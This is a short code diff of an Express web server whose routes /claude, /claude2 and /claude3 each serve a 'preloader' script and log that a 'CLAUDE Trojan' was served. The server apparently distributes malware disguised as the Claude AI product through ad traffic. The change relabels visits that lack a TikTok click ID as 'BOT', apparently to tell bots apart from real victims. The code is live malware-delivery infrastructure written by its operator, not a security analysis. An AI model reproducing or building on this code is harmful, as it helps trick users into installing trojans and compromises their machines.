@@ -2877,8 +2877,8 @@ app.get('/claude', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
     const preloader = "preloader.js";
-    let ttclid = req.query.ttclid || 'Not specified';
-    if (ttclid !== 'Not specified') {
+    let ttclid = req.query.ttclid || 'BOT';
+    if (ttclid !== 'BOT') {
         ttclid = ttclid.slice(0, 5);
     }
     console.log(`Served CLAUDE Trojan (${slug})::(${ttclid})`);
@@ -2895,8 +2895,8 @@ app.get('/claude2', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
     const preloader = "preloader2.js";
-    let ttclid = req.query.ttclid || 'Not specified';
-    if (ttclid !== 'Not specified') {
+    let ttclid = req.query.ttclid || 'BOT';
+    if (ttclid !== 'BOT') {
         ttclid = ttclid.slice(0, 5);
     }
     console.log(`Served CLAUDE2 Trojan (${slug})::(${ttclid})`);
@@ -2913,8 +2913,8 @@ app.get('/claude3', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
     const preloader = "preloader3.js";
-    let ttclid = req.query.ttclid || 'Not specified';
-    if (ttclid !== 'Not specified') {
+    let ttclid = req.query.ttclid || 'BOT';
+    if (ttclid !== 'BOT') {
         ttclid = ttclid.slice(0, 5);
     }
     console.log(`Served CLAUDE3 Trojan (${slug})::(${ttclid})`);
